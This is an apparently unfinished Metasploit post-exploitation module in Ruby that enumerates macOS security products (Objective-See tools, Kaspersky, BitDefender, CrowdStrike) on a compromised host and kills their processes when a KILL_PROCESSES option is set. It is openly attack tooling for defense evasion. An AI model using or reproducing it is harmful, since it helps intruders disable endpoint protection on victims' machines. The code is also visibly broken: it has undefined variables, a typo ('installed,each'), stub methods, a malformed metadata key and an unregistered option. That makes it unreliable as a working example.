##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Process
  include Msf::Post::File
  include Msf::Post::OSX::Priv

  # Good places to check: startup folders, Applications folder and  process list 
  # TODO put fail_no root back in and kill_processes

  def initialize(info = {})
    super(
      update_info(
        info,
        'OSX Antivirus Hunter' => 'OSX Antivirus Hunter: Enumerate and disable antivirus products',
        'Description' => %q{
          This module enumerates OSX systems for the presence of antivirus products. Target Products include: Objective-Cee, Kaspersky,
          BitDefender and CrowdStrike. Presence of these products is determined through file system artifiacts and process names. Enumeration 
          of additional products can be done through the CUSTOM_PROCESSES and CUSTOM_FILES options. The KILL_PROCESSES option will atempt to 
          send a kill signal to each of the process id's found in this module. Root privilleges are required for this capability.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'gardnerapp', 'cdelafuente-r7' ],
        'Platform' => [ 'osx' ],
        'SessionTypes' => 'meterpreter', 
        'References' => [
          ['URL', 'https://objective-see.org/tools.html']
        ]
      )

  )
    register_options(
      [
        OptString.new('CUSTOM_PROCESSES', 
                      true, ['File containing process names to hunt for. Each value should be seperated by a newline character', '']),
        OptString.new('CUSTOM_FILES',
                      true, ['File containing files and directories to hunt for. Each value should be seperated by a newline character', '']),
      ]
    )
  end

  # Determine which products are installed and their pid if any
  # products arg is in array w each elem in the format of {:name => 'AV Name', :path => '/Applications/AV Name.app'}
  # returns a hash with keys of :name, :path, and :pid
  def enumerate_files(products)
    installed = []
    products.each { |prod| installed << prod if directory?(prod) or file?(prod) }
    installed
  end

  def objective_see
    ['LuLu', 'BlockBlock Helper', 'Do Not Disturb', 'ReiKey', 'RansomWhere', 'OverSight']
     # .map! {|p| "/Applications/#{p}.app"}
  end 

  def kapersky; end 
  def bitdefender; end 
  def crowdstrike; end 

  # good acessory canidate method
  def file_to_array(file)
    f = File.open file
    f.readlines.map(&chomp)
  end 

  def all_products
    all = []
    %i[objective_see kapersky bitdefender crowdstrike].each {|p| all.merge p}
  end 

  def enum_processes(proc_array)
    @processes.select do |element|
      proc_array.each do |process| 
        return true if element =~ /#{process}/i # this may only in the block or out of enum_processes need to test this method thuroughly 
      end
    end 
  end

  def fail_if_not_root
    fail_with(Failure::BadConfig, "Current session is not root. Please escelate privilleges before re-running this module.") unless is_root? 
  end 

  def run
    # TODO test, get more products. Test custom file, reading file. 
    print_status('Retrieving process list...')
    @processes = get_processes

    print_status('Hunting processes for AV products...')

    relevant_processes = enum_processes(all_products)

    if datastore['CUSTOM_PROCESSES']
      print_status('Hunting for custom AV processes...') 
      custom_processes = file_to_array datastore['CUSTOM_PROCESSES']
      relevant_processes.merge enum_processes(custom_processes)
    end 

    av_files = [] #todo 
    installed_files = enumerate_files av_files 

    if datastore['CUSTOM_FILES']
      print_status('Hunting for custom AV files...')
      custom_files = file_to_array datastore['CUSTOM_FILES']
      installed_files << enumerate_files custom_files
    end 
    
    if datastore['KILL_PROCESSES']
      fail_if_not_root
      installed,each do |process|
       result = kill_process process['pid']
       print_good("Kill signal for #{process['name']} #{pid} was successful") if result
      end 
    end 

    # we arehere 

    if prods.empty?
      print_error('No AVproducts were found to be installed on the system.')
    else
      print_good('The following AV products were found installed on the system:')
      prods.each { |prod| print_good("Found #{prod.name} with pid #{prod.pids.inspect}") }
    end

    installed_product = { 'installed products' => products.map(&:name).join(', ') }
    report_note(host: target_host, type: 'osx.antivirus', 
                data: installed_product, update: :unique_data)

    if datastore['KILL_PROCESSES']
      fail_if_not_root
      products.each do |prod|
        prod[:pid].each {|pid| kill_process pid}
      end 
    end
  end
end
